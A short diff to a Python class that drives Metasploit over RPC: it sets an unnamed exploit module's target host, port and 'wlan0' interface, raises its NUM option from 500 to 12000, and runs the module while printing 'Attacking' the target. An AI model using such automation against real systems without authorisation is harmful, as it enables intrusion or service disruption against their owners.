@@ -18,7 +18,7 @@ class Metasploit:
         exploit['RHOSTS'] = ip
         exploit['RPORT'] = port
         exploit['INTERFACE'] = 'wlan0'
-        exploit['NUM'] = 500
+        exploit['NUM'] = 12000
         print(exploit.description)
         print(f'Attacking {ip} on port {port}')
         print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
